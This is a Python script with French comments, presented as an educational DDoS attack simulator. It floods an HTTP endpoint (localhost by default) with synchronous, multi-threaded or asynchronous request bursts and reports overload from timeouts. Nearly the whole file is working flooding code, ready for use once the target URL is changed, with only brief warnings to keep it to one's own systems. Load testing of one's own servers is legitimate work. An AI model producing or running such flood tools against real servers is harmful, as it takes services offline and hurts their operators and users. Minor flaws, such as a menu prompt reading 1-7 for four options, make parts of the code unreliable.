#!/usr/bin/env python3
"""
Simulation d'attaque DDoS (Distributed Denial of Service)
Envoi massif de requêtes pour surcharger le serveur
⚠️ À UTILISER UNIQUEMENT SUR VOS PROPRES SYSTÈMES
"""

import requests
import asyncio
import aiohttp
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from tqdm import tqdm

init(autoreset=True)

TARGET_URL = "http://localhost/"
TARGET_DATA_URL = "http://localhost/login/"


def banner():
    print(f"""
{Fore.RED}╔═══════════════════════════════════════════════════╗
║          💥 DDOS ATTACK SIMULATOR                ║
║              POUR TESTS PÉDAGOGIQUES              ║
║        ⚠️  NE PAS UTILISER SUR DES TIERS          ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
""")


def single_request(url, data=None):
    """Envoie une seule requête"""
    try:
        if data:
            response = requests.post(url, json=data, timeout=2)
        else:
            response = requests.get(url, timeout=2)
        return response.status_code, True
    except requests.exceptions.Timeout:
        return 0, False  # Timeout = serveur surchargé
    except requests.exceptions.RequestException:
        return 0, False


def synchronous_flood(num_requests, url, data=None):
    """Flood synchrone (lent mais simple)"""
    print(f"\n{Fore.CYAN}[*] Démarrage flood synchrone")
    print(f"[*] Nombre de requêtes: {num_requests}")
    print(f"[*] URL cible: {url}{Style.RESET_ALL}\n")
    
    start_time = time.time()
    success_count = 0
    timeout_count = 0
    error_count = 0
    
    for _ in tqdm(range(num_requests), desc="Envoi", colour="red"):
        status, success = single_request(url, data)
        
        if success:
            success_count += 1
        elif status == 0:
            timeout_count += 1
        else:
            error_count += 1
    
    elapsed = time.time() - start_time
    
    print(f"\n{Fore.CYAN}═══════════════ RÉSULTATS ═══════════════{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Temps total: {elapsed:.2f}s")
    print(f"Requêtes/seconde: {num_requests/elapsed:.2f}")
    print(f"Requêtes réussies: {Fore.GREEN}{success_count}{Style.RESET_ALL}")
    print(f"Timeouts: {Fore.YELLOW}{timeout_count}{Style.RESET_ALL}")
    print(f"Erreurs: {Fore.RED}{error_count}{Style.RESET_ALL}\n")
    
    if timeout_count > num_requests * 0.3:
        print(f"{Fore.RED}⚠️  Le serveur montre des signes de surcharge ! ({timeout_count} timeouts){Style.RESET_ALL}")


def threaded_flood(num_requests, num_threads, url, data=None):
    """Flood multi-thread (plus rapide)"""
    print(f"\n{Fore.CYAN}[*] Démarrage flood multi-thread")
    print(f"[*] Nombre de requêtes: {num_requests}")
    print(f"[*] Nombre de threads: {num_threads}")
    print(f"[*] URL cible: {url}{Style.RESET_ALL}\n")
    
    start_time = time.time()
    success_count = 0
    timeout_count = 0
    error_count = 0
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        
        for _ in range(num_requests):
            future = executor.submit(single_request, url, data)
            futures.append(future)
        
        for future in tqdm(as_completed(futures), total=num_requests, desc="Envoi", colour="red"):
            status, success = future.result()
            
            if success:
                success_count += 1
            elif status == 0:
                timeout_count += 1
            else:
                error_count += 1
    
    elapsed = time.time() - start_time
    
    print(f"\n{Fore.CYAN}═══════════════ RÉSULTATS ═══════════════{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Temps total: {elapsed:.2f}s")
    print(f"Requêtes/seconde: {num_requests/elapsed:.2f}")
    print(f"Requêtes réussies: {Fore.GREEN}{success_count}{Style.RESET_ALL}")
    print(f"Timeouts: {Fore.YELLOW}{timeout_count}{Style.RESET_ALL}")
    print(f"Erreurs: {Fore.RED}{error_count}{Style.RESET_ALL}\n")
    
    if timeout_count > num_requests * 0.3:
        print(f"{Fore.RED}⚠️  Le serveur est surchargé ! ({timeout_count} timeouts){Style.RESET_ALL}")
    
    return {
        'elapsed': elapsed,
        'rps': num_requests/elapsed,
        'success': success_count,
        'timeouts': timeout_count,
        'errors': error_count
    }


async def async_request(session, url, data=None):
    """Requête asynchrone"""
    try:
        if data:
            async with session.post(url, json=data, timeout=aiohttp.ClientTimeout(total=2)) as response:
                return response.status, True
        else:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=2)) as response:
                return response.status, True
    except asyncio.TimeoutError:
        return 0, False
    except Exception:
        return 0, False


async def async_flood_worker(num_requests, url, data=None):
    """Worker asynchrone pour le flood"""
    success_count = 0
    timeout_count = 0
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        
        for _ in range(num_requests):
            task = async_request(session, url, data)
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, tuple):
                status, success = result
                if success:
                    success_count += 1
                else:
                    timeout_count += 1
            else:
                timeout_count += 1
    
    return success_count, timeout_count


def async_flood(num_requests, url, data=None):
    """Flood asynchrone (le plus rapide)"""
    print(f"\n{Fore.CYAN}[*] Démarrage flood asynchrone (HAUTE VITESSE)")
    print(f"[*] Nombre de requêtes: {num_requests}")
    print(f"[*] URL cible: {url}{Style.RESET_ALL}\n")
    
    start_time = time.time()
    
    success_count, timeout_count = asyncio.run(async_flood_worker(num_requests, url, data))
    
    elapsed = time.time() - start_time
    error_count = num_requests - success_count - timeout_count
    
    print(f"\n{Fore.CYAN}═══════════════ RÉSULTATS ═══════════════{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Temps total: {elapsed:.2f}s")
    print(f"Requêtes/seconde: {Fore.YELLOW}{num_requests/elapsed:.2f}{Style.RESET_ALL}")
    print(f"Requêtes réussies: {Fore.GREEN}{success_count}{Style.RESET_ALL}")
    print(f"Timeouts: {Fore.YELLOW}{timeout_count}{Style.RESET_ALL}")
    print(f"Erreurs: {Fore.RED}{error_count}{Style.RESET_ALL}\n")
    
    if timeout_count > num_requests * 0.3:
        print(f"{Fore.RED}⚠️  SERVEUR COMPLÈTEMENT SURCHARGÉ ! ({timeout_count} timeouts){Style.RESET_ALL}")


def main():
    banner()
    
    print(f"{Fore.WHITE}Sélectionnez le type d'attaque DDoS:")
    print("1. Flood synchrone (lent, ~100 req/s)")
    print("2. Flood multi-thread (rapide, ~500 req/s)")
    print("3. Flood asynchrone (très rapide, ~2000 req/s)")
    print("4. Quitter{Style.RESET_ALL}\n")
    
    choice = input(f"{Fore.CYAN}Votre choix (1-7): {Style.RESET_ALL}")
    
    if choice == "1":
        num = int(input(f"{Fore.WHITE}Nombre de requêtes (ex: 100): {Style.RESET_ALL}"))
        synchronous_flood(num, TARGET_URL, {"username": "test", "password": "test"})
    
    elif choice == "2":
        num = int(input(f"{Fore.WHITE}Nombre de requêtes (ex: 500): {Style.RESET_ALL}"))
        threads = int(input(f"{Fore.WHITE}Nombre de threads (ex: 50): {Style.RESET_ALL}"))
        threaded_flood(num, threads, TARGET_URL, {"username": "test", "password": "test"})
    
    elif choice == "3":
        num = int(input(f"{Fore.WHITE}Nombre de requêtes (ex: 1000): {Style.RESET_ALL}"))
        async_flood(num, TARGET_URL, {"username": "test", "password": "test"})
    
    elif choice == "4":
        print(f"{Fore.CYAN}[*] Au revoir !{Style.RESET_ALL}")
    
    else:
        print(f"{Fore.RED}[✗] Choix invalide{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attaque interrompue{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Erreur: {str(e)}{Style.RESET_ALL}")